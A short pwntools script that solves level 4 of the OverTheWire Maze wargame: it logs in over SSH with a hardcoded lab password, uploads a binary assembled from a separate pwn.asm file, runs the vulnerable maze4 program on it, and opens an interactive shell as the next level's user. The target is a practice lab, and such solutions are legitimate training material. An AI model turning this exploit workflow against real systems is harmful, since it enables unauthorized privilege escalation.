#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 4
USER = 'maze%s' % level
HOST = 'maze.labs.overthewire.org'
PASS = 'deekaihiek'
PORT = 2225


def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

def execute_payload(sh):
    shell = sh.run('/bin/sh')
    shell.sendline("mkdir /tmp/tald4")
    sh.upload_file(b'pwn', remote="/tmp/tald4/pwn")
    shell.sendline("chmod +x /tmp/tald4/pwn")
    time.sleep(0.05)
    w = log.progress("Executing maze 4...")
    shell = sh.run(b'/maze/maze4 /tmp/tald4/pwn')
    w.success("maze5 shell established")
    shell.interactive()

def compile_pwn():
    w = log.progress("Compiling pwn...")
    compile_pwn_str = "nasm -f bin -o pwn pwn.asm"
    p = process('/bin/sh')
    p.sendline(compile_pwn_str)
    w.success("compiled")

compile_pwn()
sh = connect_to_level()
execute_payload(sh)
